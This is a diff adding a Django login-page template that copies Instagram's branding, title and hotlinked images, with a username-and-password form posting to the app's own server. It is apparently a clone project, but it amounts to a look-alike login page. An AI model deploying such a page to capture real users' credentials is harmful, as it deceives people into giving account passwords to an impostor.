@@ -1,0 +1,80 @@
+{% load static %}
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
+  <title>Instagram</title>
+  <link rel="stylesheet" href="{% static '/style.css' %}">
+
+  <link rel="icon" href="https://www.instagram.com/static/images/ico/favicon-192.png/68d99ba29cc8.png" />
+</head>
+<body>
+  <div class="container">
+    <div class="phone-preview">
+      <img src="https://www.instagram.com/static/images/homepage/screenshots/screenshot1.png/fdfe239b7c9f.png" alt="Instagram Preview">
+    </div>
+
+
+
+
+
+    <div class="form-container">
+      <div class="form-box">
+        <h1 class="logo">Instagram</h1>
+        <form method="POST">
+          {% csrf_token %}
+          {% if messages %}
+          <div>
+           {% for message in messages %}
+           {{message}}
+           {% endfor %}
+          </div>
+          {% endif %}
+        <input type="text" placeholder="Phone number, username, or email" name="username"/>
+        <input type="password" placeholder="Password" name="password" /> 
+        {% comment %} <button onclick="login()">Log in</button> {% endcomment %}
+       
+         
+          
+          <button type="submit">Login</button>
+        </form>
+        <a href="{% url 'FriendUser' %}"></a>
+        {% comment %} {% if messages %}
+  {% for message in messages %}
+    <p style="color:red;">{{ message }}</p>
+  {% endfor %}
+{% endif %} {% endcomment %}
+{% comment %} {% for message in messages %}
+  <p style="color:red;">{{ message }}</p>
+{% endfor %} {% endcomment %}
+        <div class="separator"><span>OR</span></div>
+        <button class="fb-login">Log in with Facebook</button>
+        <a href="#" class="forgot">Forgot password?</a>
+      </div>
+
+
+
+
+      
+
+
+      <div class="signup-box">
+        <p>Don't have an account? <a href="{% url 'SignUser' %}">Sign up</a>
+        </p>
+
+      </div>
+
+      <div class="get-app">
+        <p>Get the app.</p>
+        <div class="app-links">
+        <img src="{% static '/playstore.webp' %}" alt="Logo">
+        <img src="{% static '/microsoft.png' %}" alt="Logo">
+        </div>
+      </div>
+    </div>
+  </div>
+
+ 
+</body>
+</html>
